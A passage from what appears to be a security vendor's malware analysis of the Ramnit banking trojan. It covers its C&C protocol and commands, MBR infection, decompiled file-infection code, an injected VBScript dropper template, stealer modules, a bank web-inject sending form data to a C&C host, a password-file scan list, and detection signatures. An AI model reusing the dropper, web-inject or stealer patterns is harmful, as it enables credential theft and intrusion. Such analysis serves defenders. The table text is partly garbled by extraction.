Sends the encrypted data to a remote location through port Block[1] Dword, length for the following data\n443. The following is how DLL_2 sends the buffer to a remote\n\nBlock[5:] Bytes, data\n\nlocation:\n\n          - Sends “00 FF 4B 00 00 00” first. “00 FF” is hard coded and\nmay tell the server to allocate the buffer for receiving additional binaries. “4B 00 00 00” is the size of buffer\nsent in the second step.\n\n         - Sends the buffer content\n4. Receives and verifies the following:\n\n          - In the first instance, the received buffer’s size must be six bytes. Its format is “00 FF XX XX XX XX” (XX XX XX\nXX is the length needed and should be less than 10 million bytes)\n\n          - Allocate related buffer and received data\n5. Groups received data in blocks similar to the structure as detailed in previous steps. The mode needs to be\nset to “1” in response. DLL_2 uses the same RC4 encryption key as described in previous steps to decrypt the\nblock if the related type is set to “0”.\n6. Sends request mode 0x51 to a remote server, then verifies that the response mode is the same. If so,\nDLL_2 picks the first block in the response.\n7. Uses the selected block, as well as binaries at 0x10019310 and the socket’s IP address, to conduct\nverification.\n8. Sets the generated domain as the valid one for further communication once verification has occurred\n\nThe threat supports 21 unique commands. The following list details the commands identified through our\nanalysis:\n\n        - 0x10: Upload screen shots\n\n        - 0x15: Upload cookies\n\n        - 0x21: Request for a module\n\n        - 0x23: Request for module list\n\n        - 0xE2: Handshake with server\n\n        - 0xF0: Post threat runtime information and receive commands\n\n        - 0x51: Request binaries for further verification when handshake succeeds\n\n        - 0xF8: Report command execution returns\n\n\n-----\n\n##### Communications\n\nRamnit periodically communicates with the valid generated domain. The main loop lies in function 0x1000CD4F\nin DLL_2. DLL_2 sends gathered information to the remote server and receives additional modules and remote\ncommands.\n\nRamnit uses the following steps to request additional modules:\n\n1. DLL_1 will send “\\x23” to the named pipe to initiate the module list request.\n2. DLL_2 receives “\\x23” from the named pipe and then sends it to the remote server.\n3. DLL_2 receives encrypted module list information from the remote location, decrypts the data, and\nsends the decrypted information to DLL_1 through the named pipe.\n4. DLL_1 checks the module list and determines whether it needs to download the module. If so, it will\nsend the following request for DLL_2 to download the module:\n\n        - “\\x21\\x00[Length Of Module Name][RC4 Encrypted Module Name]\\x01\\x00\\x00\\x00”\n5. DLL_2 sends the request to the remote server in order to get the module. Once the module is received, DLL_2\ndecrypts the received binaries and send them to DLL_1 through the named pipe.\n6. DLL_1 will verify, load, encrypt, and store the received modules.\n\nThe encryption and decryption described in the previous steps is RC4 (Key= “black”).\n\nThe following is an explanation of the format of received module list:\n```\n           Offset Mode      \n             0000: 23\n             0001: Type  Dword       Data (when type is 0)\n                01  05 00 00 00  Number of the following entries\n             0006: 00  0d 00 00 00  43 6f 6f 6b 69 65 47 ... Name:\n           “CookieGrabber”\n                00  1d 00 00 00  43 6f 6f 6b 69 65 20 ... Description:\n           “Cookie.Grabber.v0.1(no.mask)”\n                01  4f 60 27 53  Time Stamp Unknown\n                01  20 63 00 00  Module Size\n                01  59 58 27 53  Time Stamp of Module\n                01  00 10 c2 06  maybe Hash, exists in the header of\n           received module\n             0024: 00  0b 00 00 00  46 74 70 47 72 61 62 ... Name: “FtpGrabber2”\n                00  10 00 00 00  46 74 70 20 47 72 61 ... Description: “Ftp.\n           Grabber.v2.0”\n                01  32 39 60 52  Time Stamp Unknown\n                01  20 39 03 00  Module Size\n                01  dd d1 d5 51  Time Stamp of Module\n                01  ac 66 00 90  maybe Hash, exists in the header of\n           received module\n             ....\n\n```\nThe following is an example the structure of the received response when requesting a specific module:\n```\n            Offset Mode\n             0000: 21\n                Type\n             0001: 00  0d 00 00 00  43 6f 6f 6b 69 ...  Module Name\n           “CookieGrabber”\n                00  20 63 00 00  Size of the Module\n             000B: [MODULE ENCRYPTED BINARIES]\n\n```\nWithin the main loop, Ramnit tries to send local information to the C&C server and expects to receive remote\ncommands and additional data needed for the received command (function at 0x10009C4B). Once the command\nis received, the threat creates a thread for handling the command. The malware supports the following\ncommands:\n\n\n-----\n\n        - getexec: Download additional executables received from a remote location and then launch them\n\n       - kos: Remove HKEY_LOCAL_MACHINE\\SOFTWARE, HKEY_LOCAL_MACHINE\\SYSTEM, HKEY_LOCAL_\nMACHINE\\HARDWARE, and HKEY_CURRENT_USER\\SOFTWARE, and then force the computer to restart\n\n        - screen: Capture screenshots and upload them in the main loop.\n\n        - update: Download an updated executable from a URL received from the remote server, then launch the\nupdated executable and terminate the old one\n\n         - cookies: Set a global flag in memory, read a log file (which stores the cookie), and send the log file to a remote\nlocation\n\n        - removecookies: Set a global flag in memory and remove cookie in another thread\n\n##### Master boot record infection routine\n\nEarlier samples of Ramnit contained code to let the threat infect the MBR in order to infect files for propagation\nand to remain persistent. Recent installers (post 2011) do not contain this functionality. The following analysis is\nbased off an older sample (MD5: 33cd65ebd943a41a3b65fa1ccfce067c, dated back to 2011).\n\n###### Infect MBR\n\nThe threat infects the MBR, as well as writes data to disk, by:\n\n         - Using CreateFile() to open a handle to \\\\.\\PhysicalDriveN\n\n        - Using WriteFile() to compromise the MBR and write data to disk\n\nOnce the MBR has been compromised, the threat stores the following components at the end of the disk:\n\n       - Clean MBR\n\n         - Compressed code to intercept start-up activities\n\n       - Compressed Ramnit sample\n###### Intercept startup activities\n\nThe threat intercepts start-up activities through the following actions:\n\n1. The malicious MBR loads the clean MBR and decompresses the code used for start-up interception\n2. The decompressed code first hooks INT 13, then jumps to the clean MBR\n3. The handler for INT 13 then:\n\n         - Searches binaries (83 C4 02 E9 00 00 E9 FD FF) for sectors read from the disk and patches them to bypass\ncode integrity checks\n\n         - Searches binaries (8B F0 85 F6 74 21/22 80 3D) and patches them with FF 15 XX XX XX XX to jump to its\ncode in protected mode\n4. The code in protected mode performs the following actions:\n\n         - Removes page-write protection\n\n          - Searches binaries (6A 4B 6A 19 E8 * E8 ) to locate and call IoInitSystem in ntoskrnl.exe\n\n          - Moves code to .reloc section of ntoskernl.exe\n\n          - Hooks the previous call to the copied code\n\n          - Restores write protection\n5. The copied code performs the following actions:\n\n          - Inserts the return address in the stack to execute code after IoInitSystem\n\n         - Loads the compressed Ramnit into memory\n\n         - Sets call back notify routine for process creation through PsSetCreateProcessNotifyRoutine\n6. The call back routine performs the following actions when the userinit.exe process is created\n\n         - Allocates memory into userinit.exe\n\n         - Decompresses Ramnit to the allocated memory\n\n         - Inserts asynchronous procedure call (APC) code by KeInsertQueueApc\n7. The APC code performs the following actions:\n\n         - Drops the decompressed Ramnit to %Temp% folder\n\n         - Launches Ramnit through CreateProcessA\n\n\n-----\n\n###### Infection routines\n\nThe following list details the sample used to analyze the MBR infection routine:\n\n        - Source: VirusTotal using F-Secure detection Win32.Ramnit.N\n\n         - File name: FlylinkDC++, FlylinkDC.exe from VirusTotal\n\n       - MD5: c234dbf746f86c61e2e0a37a222a021e\n\n       - SHA1: 43b661f9913fcb28b966ffaa379ec8349e3c93ba\n\n       - SHA256: cc7c8ab5257662e45c38472b94dfd06be295bce3086e493564fc561f4d971427\n\n         - Size: 8,295,957 bytes\n\n         - Purpose: Infected Ramnit.B file\n\nThe following lists detail the artifacts extracted/downloaded during the course of the analysis:\n\n        - Source: Dropped file\n\n        - File name: WaterMark.exe\n\n       - MD5: ba4610e9ca3ebf61ec5800955a797c13\n\n       - SHA1: 66fd641b894b56c212275eb62a45b667e6f0f78b\n\n       - SHA256: 6eb6cb7e312086b243a1606c4df19a98e1711f3de8fe96866abbd95ba0b51ff8\n\n         - Size: 69,142 bytes\n\n         - Purpose: Malicious Ramnit file dropped through infected file\n\n        - Source: Extracted from WaterMark.exe\n\n        - File name: N/A\n\n       - MD5: f73ec82a9601ff5703322b8d3793fa78\n\n       - SHA1: c70f3fc4e499a3a4a2c337651a2d2d66c4e4045d\n\n       - SHA256: 0d91fa0012274ffe4a310412492b24b119e80ca6357dd37a50bfd987afcfc853\n\n         - Size: 45,056 bytes\n\n         - Purpose: Packed UPX file containing multiple PE files\n\n        - Source: Extracted from f73ec82a9601ff5703322b8d3793fa78\n\n         - File name: rmnsoft.dll (internal dll name)\n\n       - MD5: 91ea5a24833f3993693e5cb276b51ced\n\n       - SHA1: 3a41dc5ff5b5dcf4d7c942658fa7e69998889a73\n\n       - SHA256: 85c8d08866d01bae2cca47d4c50b4b7ec7228309ab6afc5184c14e1940e29e46\n\n         - Size: 99,109 bytes\n\n        - Purpose: Main Ramnit unpacked file, which contains infection routine\n\nAs part of the infection routine, the threat first checks if the HKEY_LOCAL_MACHINE\\SOFTWARE\\WASAntidot\nsubkey contains the value name “disable”. If this value name is present, then the threat displays a MessageBox\nwith the text and caption “Antidot is activate” and doesn’t infect the computer.\n\nOtherwise, the threat proceeds to create a thread through InfectionRoutineThread. This thread contains the\nfollowing code:\n```\n           void _ _ thiscall _ _ noreturn InfectRoutineThread(void *this, int a2)\n           {\n            void *v2; // [sp-4h] [bp-4h]@1\n            v2 = this;\n\n```\nwhile ( 1 ) // Infinite Loop\n```\n            {\n             StartInfect(v2);\n             Sleep(0x7530);  // Time in miliseconds\n            }\n           }\n\n```\n\n-----\n\nStartInfect calls GetLogicalDriveStrings and gathers details on the valid drives in the computer. Then, the threat\nchecks for free space greater than 0x80000 (512KB) on these drives using CheckFreeSpace. The threat then\nchecks for drive type ”DRIVE_FIXED/ DRIVE_REMOVABLE.” If this drive type is found, then the threat calls the\nSearchInfect function.\n```\n           DWORD _ _ cdecl StartInfect()\n           {\n            DWORD result; // eax@1\n            CHAR *i; // esi@1\n            UINT v2; // eax@4\n            CHAR RootPathName; // [sp+4h] [bp-200h]@1\n            GetSystemWindowsDir();\n            result = GetLogicalDriveStringsA(0x200u, &RootPathName);\n            for ( i = &RootPathName; *i; i += result + 1 )\n            {\n             if ( CheckFreeSpace(i) == 1 )\n             {\n              v2 = GetDriveTypeA(i);\n              if ( v2 == DRIVE _ FIXED || v2 == DRIVE _ REMOVABLE )\n               SearchInfect(i, (int)i);\n             }\n             result = strlenFn(i);\n            }\n            return result;\n           }\n           int _ _ stdcall CheckFreeSpace(LPCSTR lpString2)\n           {\n            ULARGE _ INTEGER TotalNumberOfFreeBytes; // [sp+4h] [bp-41Ch]@1\n            ULARGE _ INTEGER TotalNumberOfBytes; // [sp+Ch] [bp-414h]@1\n            ULARGE _ INTEGER FreeBytesAvailableToCaller; // [sp+14h] [bp-40Ch]@1\n            CHAR DirectoryName; // [sp+1Ch] [bp-404h]@1\n            int v6; // [sp+41Ch] [bp-4h]@1\n            v6 = 0;\n            lstrcpyA(&DirectoryName, lpString2);\n            AddSlashAtEnd(&DirectoryName);\n            if ( GetDiskFreeSpaceExA(&DirectoryName, &FreeBytesAvailableToCaller,\n           &TotalNumberOfBytes, &TotalNumberOfFreeBytes)\n             && TotalNumberOfFreeBytes.QuadPart >= (unsigned int)freesize )\n             v6 = 1;\n            return v6;\n           }\n\n```\nThe SearchInfect function recursively traverses the directory and searches for files to infect. The function\nexcludes folders called “.”, “..”, and “RMNetwork”. It also excludes the %System% and %Windir% folders. If the\nthreat finds files to infect, then it calls InfectFiles and checks the file extensions and free space on the drive.\nIf the extension is DLL or EXE, the threat calls InfectExeDll. If the extension is HTML or HTM, the threat calls\nInfectHtmlhtm.\n```\n           int _ _ stdcall InfectFiles(LPCSTR lpFileName, LPCSTR lpString2)\n           {\n            int result; // eax@1\n            const CHAR *v3; // edx@2\n\n```\n\n-----\n\n```\n            result = GetExt(lpFileName);\n            if ( result )\n            {\n             if ( cmp _ _ _ m((LPCSTR)result, “exe”) == 1 ) // check exe and dll\n           extension\n             {\n              result = CheckFreeSpace(lpString2);\n              if ( result == 1 )\n               result = InfectExeDll(lpFileName);\n             }\n             else\n             {\n              result = cmp _ _ _ m(v3, “html”); // check html & htm extension\n              if ( result == 1 )\n              {\n               result = CheckFreeSpace(lpString2);\n               if ( result == 1 )\n                result = InfectHtmlHtm(lpFileName);\n              }\n             }\n            }\n            return result;\n           }\n\n###### InfectExeDLL\n\n```\nThe file rmnsoft.dll, embedded in FlylinkDC++ (MD5: c234dbf746f86c61e2e0a37a222a021e), has the ability to\ninfect PE files. In general, rmnsoft.dll infects PE files through following steps:\n\n1. Checks whether the file has already been infected by examining the last 0x24 bytes. The first dword is used as\nXOR key and all of these bytes will be XOR-encrypted. If the decrypted second dword is 0xFA1BC352, then this\nmeans that the file has already been infected, so the threat does not reinfect it.\n2. Maps the file to memory and verifies that:\n\n         - The CPU type is 0x14C and COFF Magic is 0x10B\n\n          - The security table and COM descriptor table in the data directory are “0”\n\n         - The API address for CheckSumMappedFile needs to be valid if the checksum is not “0”\n3. Tries to find the correct address in order to use LoadLibraryA and GetProcAddress from the mapped file. If the\ncorrect address cannot be found, rmnsoft.dll instead attempts to locate the relative virtual address (RVA) for\nthe first import address table (IAT) of kernel32.dll. If this fails, then the file is not infected.\n4. Appends a new section named ‘.text’ in the section table and increases the number of sections accordingly.\nThe entry point is set to the start of the new section and the delta to the original entry point is also calculated\nto ensure that it jumps back to this point correctly.\n5. Writes two types of binaries to the appended ‘.text’ section in sequence:\n\n          - Stub code used to decrypt, drop, and launch the Ramnit installer, as well as to jump back to the original\nentry point.\n\n          - XOR-encrypted binaries of the Ramnit installer. Its key length is 0x14 and is pseudo-randomly generated.\nThe pseudo-random algorithm is the same as the one described in the DLL_2 section.\n6. Randomly generates from 300 to 500 garbage bytes and writes them to the end of the infected file. Then, it\nwrites 0x24 bytes, which could be used to prevent re-infection.\n7. If CheckSumMappedFile api exists, it will be called to update the checksum in the optional header.\n\n\n-----\n\n###### InfectHtmlHtm\n\nThe function responsible for injecting this code also verifies if the file has been infected previously. Similarly to\nthe EXE and DLL function, it reads 0x24 bytes from the offset calculated as:\n```\n           FileSize - ( 3bytes + 0x24)\n\n```\nThe threat subsequently calls the “CheckMarker” function, which decrypts the 0x24 bytes using a simple XOR\ncipher with the key set to the first DWORD. It then verifies decryption by comparing the second DWORD against\nthe value 0x0FA1BC352. If these values don’t match, then the HTML file will be infected.\n\nThe VBScript code that is injected into HTML pages is constructed using three different parts. The first part,\nwhich is 0x4b bytes in size, sets the dropped file name and creates a variable that holds a copy of Ramnit.\n```\n           <SCRIPT Language=VBScript><!--\n           DropFileName = “svchost.exe”\n           WriteData = “\n\n```\nThe second part is a series of hexadecimal characters which makes up a copy of Ramnit. The first two bytes are\n0x4D5A, also known as the “MZ” header, which identifies the file as a Windows executable.\n```\n           4D5A9000000300000004000000[REDACTED]\n\n```\nThe first part is the remainder of the VBScript, which is used to write and execute the MZ to disk.\n```\n           “\n           Set FSO = CreateObject(“Scripting.FileSystemObject”)\n\n```\nDropPath = FSO.GetSpecifialFolder(2) & “\\” & DropFileName\n```\n           If FSO.FileExists(DropPath)=False Then\n           Set FileObj = FSO.CreateTextFile(DropPath, True)\n           For i = 1 to Len(WriteData) Step 2\n           FileObj.Write Chr(CLng(“&H” & Mid(WriteData,i,2)))\n           Next\n           FileObj.Close\n           End If\n           Set WSHshell = CreateObject(“WScript.Shell”)\n           WSHshell.Run DropPAth, 0\n           //--></SCRIPT><!--\n\n```\n\n-----\n\n|Table 8. Identified Ramnit modules|Col2|Col3|Col4|Col5|Col6|Col7|\n|---|---|---|---|---|---|---|\n|Time- stamp|File MD5 (Parent)|DGA Seed|MD5|Dll Name|Module Name|Description|\n|2014- 03-17|056af1afdc3 05dd978c72 8653c4ee08b|0x6CB5A7D9|7d1809c769 1a0945c7cc5 aeb27b903ab|cookie.dll|CookieGrabber|Cookie Grabber v0.1 (no mask)|\n|2014- 08-29|0265903976 bd210-80da3 b00c9d7ecdb3|0x79159C10|b1b40a587e3 de103e5ce85 d1cdce7ef9|cookie.dll|CookieGrabber|Cookie Grabber v0.2 (no mask)|\n|2013- 07-04|056af1afdc30 5dd978c728 653c4ee08b|0x6CB5A7D9|753a0ecee53 9050f9601e0 406e6c008d|ftpd.dll|FtpServer|Anonymous Ftp Server v1.0|\n|2014- 03-17|056af1afdc3 05dd978c72 8653c4ee08b|0x6CB5A7D9|f177a7bdf97 36d92a3990 56270a4812|hooker.dll|Hooker|Spy module (Zeus, SE, Root- kit, Ignore SPDY) v3.2|\n|2014- 08-25|0265903976 bd21080da3b 00c9d7ecdb3|0x79159C10|38fb33c3f4e 2584c83b2b 4005c43091|hooker.dll|Hooker|Spy module (Zeus, SE, Root- kit, Ignore SPDY) v3.2|\n|2014- 08-29|0265903976 bd21080da3b 00c9d7ecdb3|0x79159C10|8fb49c5ba17 ddce8bc3a5d e644f0a80d|hooker.dll|Hooker|Spy module (Zeus, SE, Root- kit, Ignore SPDY) v3.3|\n|2014- 03-17|0265903976 bd21080da3 b00c9d7ecdb3|0x79159C10|7e9cb3d090d 50bfecc7d90 3b751e3814|modfile.dll|DriveScan|Drive scanner v1.0|\n|2013- 07-04|056af1afdc3 05dd978c72 8653c4ee08b|0x6CB5A7D9|cedb2960a78 448e237b70 7a70ec70f7|modftp grbr.dll|FtpGrabber2|Ftp Grabber v2.0|\n|2014- 05-18|0265903976 bd21080da3 b00c9d7ecdb3|0x79159C10|2d708755927 4e7c7787d7 196f2b0c02d|modftp grbr.dll|FtpGrabber2|Ftp Grabber v2.0|\n|2012- 09-06|056af1afdc3 05dd-978c72 8653c4ee08b|0x6CB5A7D9|27b005d074 b9808ffb8ef 95dd811314f|vnc.dll|VncMod|VNC Module v1.0 (Zeus Model)|\n|2014- 03-17|0265903976 bd21080da3b 00c9d7ecdb3|0x79159C10|27b005d074 b9808ffb8ef 95dd811314f|vnc.dll|VncMod|VNC Module v1.0 (Zeus Model)|\n\n\n##### Ramnit modules\n\nTable 8 includes a\n\n_Table 8. Identified Ramnit modules_\n\nlist of recent Ramnit\n\nTime- File MD5 DGA Seed MD5 Dll Module Description\n\nmodules identified by\nSymantec. stamp (Parent) Name Name\n\n2014- 056af1afdc3 0x6CB5A7D9 7d1809c769 cookie.dll CookieGrabber Cookie Grabber\n\n###### CookieGrabber 03-17 05dd978c72 1a0945c7cc5 v0.1 (no mask)\n\n8653c4ee08b aeb27b903ab\n\nThe CookieGrabber\n\n2014- 0265903976 0x79159C10 b1b40a587e3 cookie.dll CookieGrabber Cookie Grabber\n\nmodule steals cookies 08-29 bd210-80da3 de103e5ce85 v0.2 (no mask)\nfrom different b00c9d7ecdb3 d1cdce7ef9\napplications and\n\n2013- 056af1afdc30 0x6CB5A7D9 753a0ecee53 ftpd.dll FtpServer Anonymous Ftp\n\nstores them in a zip 07-04 5dd978c728 9050f9601e0 Server v1.0\nfile so that the cookies 653c4ee08b 406e6c008d\ncan be submitted to\n\n2014- 056af1afdc3 0x6CB5A7D9 f177a7bdf97 hooker.dll Hooker Spy module\n\nthe C&C server. The 03-17 05dd978c72 36d92a3990 (Zeus, SE, Root-\nzip file is stored in 8653c4ee08b 56270a4812 kit, Ignore SPDY)\n%SystemDrive%\\ v3.2\nDocuments and\n\n2014- 0265903976 0x79159C10 38fb33c3f4e hooker.dll Hooker Spy module\n\nSettings\\All Users\\ 08-25 bd21080da3b 2584c83b2b (Zeus, SE, Root-\nApplication Data\\ 00c9d7ecdb3 4005c43091 kit, Ignore SPDY)\n\n[RANDOM FILE NAME]. v3.2\nlog. The module 2014- 0265903976 0x79159C10 8fb49c5ba17 hooker.dll Hooker Spy module\nis loaded using an 08-29 bd21080da3b ddce8bc3a5d (Zeus, SE, Root-\nexport function called 00c9d7ecdb3 e644f0a80d kit, Ignore SPDY)\nStartRoutine. This v3.3\ninstructs the module 2014- 0265903976 0x79159C10 7e9cb3d090d modfile.dll DriveScan Drive scanner\nto gather cookies from 03-17 bd21080da3 50bfecc7d90 v1.0\na number of browsers b00c9d7ecdb3 3b751e3814\nwhich can be used 2013- 056af1afdc3 0x6CB5A7D9 cedb2960a78 modftp FtpGrabber2 Ftp Grabber v2.0\nto hijack sessions 07-04 05dd978c72 448e237b70 grbr.dll\nof online banking 8653c4ee08b 7a70ec70f7\nwebsites and social 2014- 0265903976 0x79159C10 2d708755927 modftp FtpGrabber2 Ftp Grabber v2.0\nmedia sites. The library 05-18 bd21080da3 4e7c7787d7 grbr.dll\nused to create the b00c9d7ecdb3 196f2b0c02d\narchive file is called 2012- 056af1afdc3 0x6CB5A7D9 27b005d074 vnc.dll VncMod VNC Module v1.0\nZipUtils. 09-06 05dd-978c72 b9808ffb8ef (Zeus Model)\n\n8653c4ee08b 95dd811314f\n\nThis module has the\n\n2014- 0265903976 0x79159C10 27b005d074 vnc.dll VncMod VNC Module v1.0\n\nability to steal cookies 03-17 bd21080da3b b9808ffb8ef (Zeus Model)\nfrom the following 00c9d7ecdb3 95dd811314f\napplications:\n\n###### Internet Explorer\n\n        - Finds the location of the cookies using the SHGetFolderPathA API with the CSIDL_COOKIES (0x33) parameter.\nFor example, in Windows XP, the module returns %SystemDrive%\\Document and Settings\\Administrator\\\nCookies\n\n         - Steals all of the files from this location\n\n###### Firefox\n\n        - Checks %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Mozilla\\Firefox\\ for profiles.\nini. If the module does not find this file, it searches in %SystemDrive%\\WINDOWS\\Application Data\\Mozilla\\\nFirefox\\\n\n         - Extracts “Path” from profiles.ini and steals the cookies.txt or cookies.sqlite file\n\n###### Opera\n\n        - Steals %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Opera\\profile\\cookies4 dat and\n\n\n-----\n\n%SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Opera\\cookies4.dat\n\n         - Queries registry for the application path for opera.exe\n\n###### Flash\n\n        - Steals sol files from %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Macromedia\\Flash\nPlayer\\#SharedObjects\n\n###### Safari\n\n        - Steals %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Apple Computer\\Safari\\Cookies\\\nCookies.plist\n\n###### Chrome\n\n        - Steals %SystemDrive%\\Documents and Settings\\All Users\\Application Data\\Google\\Chrome\\User Data\\\nDefault\\Cookies and %SystemDrive%\\Documents and Settings\\All Users\\Application Data Google\\Chrome\\\nUser Data\\Default\\Extension Cookies\n\nThe following is an example of the zip file’s structure that contains the stolen cookies:\n\n%Randomfilename%.log\n```\n           ->IE Cookies\n\n```\n->FireFox Cookies\\\\Profile %d\\\\cookies.sqlite\n->FireFox Cookies\\\\Profile %d\\\\cookies.txt\n->Opera\\\\Profile %d\\\\cookies4.dat\n```\n           ->SOL\n\n```\n->Safari\\\\Cookies.plist\n->Chrome\\\\Cookies\n->Chrome\\\\Extension Cookies\n\n###### Ftp Grabber v2.0\n\nThe purpose of this module is to steal credentials from following FTP clients:\n\n        - Far\n\n       - Windows/Total commander\n\n       - WS FTP\n\n        - Cute FTP\n\n        - FlashXp\n\n         - FileZilla\n\n       - FtpCommander\n\n        - BulletproofFTP\n\n        - SmartFtp\n\n        - TurboFtp\n\n        - FFFtp\n\n        - Coffee cup ftp\n\n        - Core ftp\n\n        - FtpExplorer\n\n         - Frigate 3\n\n        - WebSitePublisher\n\n        - ClassicFTP\n\n         - Fling\n\n        - SoftFx FTP\n\n        - Directory opus\n\n        - LeapFtp\n\n       - WinScp\n\n\n-----\n\n        - 32bit FTP\n\n        - FtpControl\n\n        - NetDrive\n\nThis is achieved by checking configuration files and registry hives for these applications.\n\n###### Anonymous Ftp Server v1.0\n\nRamnit has the ability to launch an FTP daemon on Transmission Control Protocol (TCP) port 22. The login\ncredentials that Ramnit needs to access the service are hardcoded in the sample. The list of commands\nsupported by the server is as follows:\n\n       - USER\n\n       - PASS\n\n      - CWD\n\n       - CDUP\n\n       - QUIT\n\n       - PORT\n\n       - PASV\n\n       - TYPE\n\n      - MODE\n\n       - RETR\n\n       - STOR\n\n       - APPE\n\n       - REST\n\n       - RNFR\n\n       - RNTO\n\n       - ABOR\n\n       - DELE\n\n      - RMD\n\n      - MKD\n\n        - LIST\n\n       - NLST\n\n       - SYST\n\n       - STAT\n\n       - HELP\n\n      - NOOP\n\n        - SIZE\n\n       - EXEC\n\n      - PWD\n\nRamnit’s operators can execute commands through the running FTP server, as one of the supported commands\nis EXEC. Ramnit’s FTP server has the following unique banner:\n```\n           220 220 RMNetwork FTP\n\n###### Spy module (Zeus, SE, Rootkit, Ignore SPDY) v3.3\n\n```\nThis module provides web injection functionality for Ramnit, allowing the threat to inject web forms into the\nuser’s browser and trick the victim into giving the attackers their personal information and bank account\ndetails. The original web inject’s definition matches an old Zeus configuration file (v2.1.1.0). The main difference\nbetween Ramnit and Zeus’ web injection modules is that Ramnit’s module does not communicate directly with\nthe C&C server. This communication is instead performed by DLL _1 and DLL_2.\n\nThe most recent C&C server observed being used by v3.2 of this module is santabellasedra[.]com. At the time of\ntesting, v3.2 was not distributed with an updated configuration file.\n\n\n-----\n\nThe following is an example of Ramnit’s web inject definition:\n```\n           set _ url https://*.[REMOVED].com* GP\n           set _ var [BANK NAME]Login=USERID [BANK NAME]Pwd=PIN [BANK NAME]\n           ToDoAcc=payeeAcid [BANK NAME]Amount=Txn _ Amt aAccName=userName\n           tmpSelectId=pymtDrAccDetails\n           set _ url https://banking*.[REMOVED].com/IBAU/BANKAWAY* GP\n           data _ before\n           Payment successful</span>\n           data _ end\n           data _ inject\n           <%REMOTE=http://carnavaaalfrog.com/[REMOVED]/input.\n           php?id=<%IDBOT%>[[REMOVED]>%>\n           data _ end\n           data _ after\n           data _ end\n\n```\nApart from web injects, Ramnit implements\n[a feature called Webfilters, which is similar](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/zeus_king_of_bots.pdf)\n[to Zeus’ Webfilters capability. This feature](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/zeus_king_of_bots.pdf)\nspecifies a list of URLs that should be\nmonitored. Any data that is sent to these\nURLs is also sent to the C&C server.\n\nThe following is an example of a Webfilters\ndefinition:\n```\n           entry “WebFilters”\n           “~business.h[REMOVED].\n           co.uk*”\n           “~*bank.b[REMOVED].co.uk*”\n           “~*r[REMOVED]l.com*”\n           “~*n[REMOVED].com*”\n           “~l[REMOVED].co.uk*”\n           “~l[REMOVED].co.uk*”\n           “~f[REMOVED].co.uk*”\n\n```\n_Figure 4. Legitimate banking login page_\n```\n           “~personal/a[REMOVED]”\n           “~t[REMOVED].com/sss/\n           authcc*”\n           “~secure.t[REMOVED].co.uk*”\n           “~h[REMOVED].co.uk*”\n           “~onlinebanking.n[REMOVED].\n           co.uk*”\n           “~h[REMOVED].co.uk*”\n           “h[REMOVED].co.uk*”\n           “l[REMOVED].co.uk*”\n           “h[REMOVED].co.uk*”\n           “s[REMOVED].co.uk*”\n\n```\nFigure 4 shows a legitimate banking login\npage and Figure 5 shows a Ramnit web inject\nthat mimics the appearance of the legitimate\npage.\n\n###### VNC Module v1.0 (Zeus Model)\n\nThis module runs a VNC server on\ncompromised computers. The module’s _Figure 5. Fraudulent login page produced by Ramnit’s web inject_\n\n\n-----\n\ncode matches the leaked Zeus source code’s module for VNC server operation called vncserver.cpp. The module\ncreates the thread that sets up socket-listening for new, incoming connections. The socket binds to TCP port 23.\nThis port is hardcoded in the sample. The VNC server does not use any authentication and creates a new desktop\nsession once the VNC client is connected.\n\n###### DriveScanner\n\nThe purpose of the DriveScanner module is to steal files that match details in the configuration file provided by\nthe attackers. All matching files are zipped to %SystemDrive%\\Documents and Settings\\All Users\\Application\nData\\[RANDOM FILE NAME].log. The module uses the SHGetFolderPathA API with CSIDL_LOCAL_APPDATA to\nlocate the folder path. The module uses GetLogicalDriveStrings to find details on valid drives on the computer\nand then checks the drive type through GetDriveType. If the type is DRIVE_FIXED, then module picks the drive for\nscanning.\n\nThe DriveScanner module’s configuration file consists of two parts. At the beginning of the configuration file,\nthere are entries that should be matched. The end of the configuration file contains an exclusion list.\n\nThe following is an example of the contents of the configuration file:\n```\n           *wallet.dat\n           *pass*\n           *pass*.txt\n           *pass*.docx\n           *pass*.xlsx\n           *password*\n           *password*.txt\n           *password*.docx\n           *password*.xlsx\n           *passwords*.\n           *passwords*.txt\n           *passwords*.docx\n           *passwords*.xlsx\n           [REMOVED]\n           !*microsoft*\n           !*.inf*\n           !*.sys*\n           !*.dat*\n           !*.dll*\n           !*.pdf*\n           !*.cat*\n           !*.enc*\n           !*.url*\n           !*windows*\n           !*system*\n           !*SYSTEM*\n           !*winxp*\n\n```\n\n-----\n\n### DETECTION GUIDANCE\n\n## All gathered data from web injects is sent to a C&C server defined in the module’s configuration file...\n\n\n-----\n\n#### Detection guidance\n\n##### Network traffic\n\nThis section details recommendations that may be undertaken to identify W32.Ramnit. Please note, the\nfollowing may be prone to false positives (FP) and could be better suited for telemetry-gathering purposes.\n\n###### C&C communication\n\n        - Post request to C&C server:\n\n        - Check for HTTP POST request\n\n         - Check if POST requests contains “go\\.gif” or “/logo\\.gif” in URI string\n\n         - Check if POST request URI string matches the following regex:\n\n         - “\\?[a-z0-9]{7}=[0-9]{9}”\n\n        - C&C check-in\n\n        - Check if TCP packet contains the following Ramnit malware C&C communication header string:\n\n        - “\\x00\\xFF[\\x4B\\x4C]\\x00\\x00\\x00\\xE2\\x00[\\x20\\x21]\\x00\\x00\\x00”\n\n        - C&C check-in\n\n         - Check if TCP dst port is set to 443\n\n        - Check if a TCP packet contains the following C&C communication header string:\n\n       - “\\x00\\xFF\\xBb\\x00\\x00\\x00\\xE2\\x00\\x20\\x00\\x00\\x00”\n###### Malicious scripts\n\n         - Drop-file path\n\n         - Check for any connections from chrome.exe, iexplore.exe, firefox.exe, safari.exe, and opera.exe\n\n        - Check if the HTML page contains <script> tag\n\n         - Check if the following string exists within the <script> block:\n\n        - “pPath = FSO.GetSpecialFolder(2) & “\\” & DropFileName”\n\n         - Drop-file path\n\n         - Check if the HTML page contains a string which matches the following string:\n\n        - “pPath = FSO.GetSpecialFolder(2) & “\\” & DropFileName\n\n         - If it exists, then check ahead by 263 characters for the following string:\n\n        - “\\.Run\\ DropPath”\n\n        - Write MZ to disk\n\n         - Check if the HTML page contains the following string:\n\n        - “OpFileName = “svchost.exe”.WriteData = 